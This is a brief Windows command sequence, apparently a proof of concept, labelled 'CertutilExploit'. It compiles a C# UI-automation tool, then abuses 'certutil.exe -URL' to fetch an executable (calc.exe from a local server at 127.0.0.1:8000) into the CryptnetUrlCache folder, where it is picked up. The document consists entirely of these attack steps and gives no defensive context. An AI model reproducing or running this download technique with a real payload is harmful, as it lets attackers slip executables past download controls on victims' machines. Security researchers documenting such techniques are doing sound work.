C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe ^
  /t:exe ^
  /out:C:\Temp\CertutilExploit\CertUtilAutomation.exe ^
  /reference:System.dll ^
  /reference:System.Core.dll ^
  /reference:System.Data.dll ^
  /reference:System.Xml.dll ^
  /reference:System.Xml.Linq.dll ^
  /reference:"C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8.1\UIAutomationClient.dll" ^
  /reference:"C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8.1\UIAutomationTypes.dll" ^
  C:\Temp\CertutilExploit\CertUtilAutomation.cs

"C:\Windows\System32\certutil.exe" -URL http://127.0.0.1:8000/calc.exe

C:\Temp\CertutilExploit\CertUtilAutomation.exe

C:\Users\%USERNAME%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content\calc.exe
